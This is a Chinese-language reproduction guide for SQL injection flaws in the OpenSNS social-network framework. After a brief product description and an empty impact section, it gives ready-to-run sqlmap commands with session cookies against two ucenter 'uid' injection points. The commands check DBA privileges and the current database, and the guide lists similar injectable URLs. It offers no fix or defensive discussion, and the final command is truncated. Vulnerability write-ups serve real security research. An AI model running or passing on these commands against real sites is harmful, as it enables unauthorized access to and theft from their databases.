OpenSNS sql注入
===============

一、漏洞简介
------------

OpenSNS是基于OneThink的轻量级社交化用户中心框架，系统秉持简约的设计风格，注重交流，为用户提供了一套轻量级的社交方案。OpenSNS前身是"ThinkOX"，2015年1月28号正式更名为OpenSNS。
OpenSNS采用PHP+MYSQL构建的一款有"身份"的开源免费SNS社交系统，适用于多种社会关系。
OpenSNS采用thinkphp框架编写。系统的设计遵循高内聚低耦合，允许管理员自由开启关闭功能模块。不仅如此，OpenSNS还内置了一个功能扩展商店，可以一键在线安装新的功能扩展。
OpenSNS目前有大量的国内开发者，云市场也上架了大量的第三方功能模块和主题应用，使OpenSNS可以同时满足各行各业的社交需求。

二、漏洞影响
------------

三、复现过程
------------

### SQL注入(一)

需要注册一个账号并登录

    sqlmap.py -u "http://localhost/index.php?s=/ucenter/Config/&uid=1*" --cookie " PHPSESSID=hvvkoc2sef0l1kemdrvnknd2s7; UM_distinctid=16bda55e991192-05e2b3083ccb28-1368624a-144000-16bda55e992c7; CNZZDATA1254932726=287816123-1562732483-%7C1562738136" --batch --technique=T --dbms "mysql"
    sqlmap.py -u "http://localhost/index.php?s=/ucenter/Config/&uid=1*" --cookie " PHPSESSID=hvvkoc2sef0l1kemdrvnknd2s7; UM_distinctid=16bda55e991192-05e2b3083ccb28-1368624a-144000-16bda55e992c7; CNZZDATA1254932726=287816123-1562732483-%7C1562738136" --batch --technique=T --dbms "mysql" --is-dba
    sqlmap.py -u "http://localhost/index.php?s=/ucenter/Config/&uid=1*" --cookie " PHPSESSID=hvvkoc2sef0l1kemdrvnknd2s7; UM_distinctid=16bda55e991192-05e2b3083ccb28-1368624a-144000-16bda55e992c7; CNZZDATA1254932726=287816123-1562732483-%7C1562738136" --batch --technique=T --dbms "mysql" --current-db

#### 同类h注入点

<http://0-sec.org/index.php?s=/ucenter/index/index&uid=10>
<http://0-sec.org/index.php?s=/ucenter/index/information&uid=10>

### SQL注入(二)

需要注册一个账号并登录

    sqlmap.py -u "http://localhost/index.php?s=/ucenter/index/getExpandInfo&uid=1)*--+" --cookie "PHPSESSID=hvvkoc2sef0l1kemdrvnknd2s7; UM_distinctid=16bda55e991192-05e2b3083ccb28-1368624a-144000-16bda55e992c7; CNZZDATA1254932726=287816123-1562732483-%7C1562738136;opensns_OX_LOGGED_USER=HYnkRzJxTkdgAdhKfVfkJ8n4kjemH%3DgWJU16IaiiFhglB7nm66fAxbZ9TTZXz%3DWWqjeQ5%3Di4bjZITf04G20E4v35V135D8miM5F2Jzf6VkgkYymtohawe" --dbms "mysql" --batch
    sqlmap.py -u "http://localhost/index.php?s=/ucenter/index/getExpandInfo&uid=1)*--+" --cookie "PHPSESSID=hvvkoc2sef0l1kemdrvnknd2s7; UM_distinctid=16bda55e991192-05e2b3083ccb28-1368624a-144000-16bda55e992c7; CNZZDATA1254932726=287816123-1562732483-%7C1562738136;opensns_OX_LOGGED_USER=HYnkRzJxTkdgAdhKfVfkJ8n4kjemH%3DgWJU16IaiiFhglB7nm66fAxbZ9TTZXz%3DWWqjeQ5%3Di4bjZITf04G20E4v35V135D8miM5F2Jzf6VkgkYymtohawe" --dbms "mysql" --batch --is-dba
    sqlmap.py -u "http://localhost/index.php?s=/ucenter/index/getExpandInfo&uid=1)*--+" --cookie "PHPSESSID=hvvkoc2sef0l1kemdrvnknd2s7; UM_distinctid=16bda55e991192-05e2b3083ccb28-1368624a-144000-16bda55e992c7; CNZZDATA1254932726=287816123-1562732483-%7C1562738136;opensns_OX_LOGGED_USER=HYnkRzJxTkdgAdhKfVfkJ8n4kjemH%3DgWJU16IaiiFhglB7nm66fAxbZ9TTZXz%3DWWqjeQ5%3Di4bjZITf04G20E4v35V135D8miM5F2Jzf6VkgkYymtohawe" --dbms "mysql" --batch --current-d
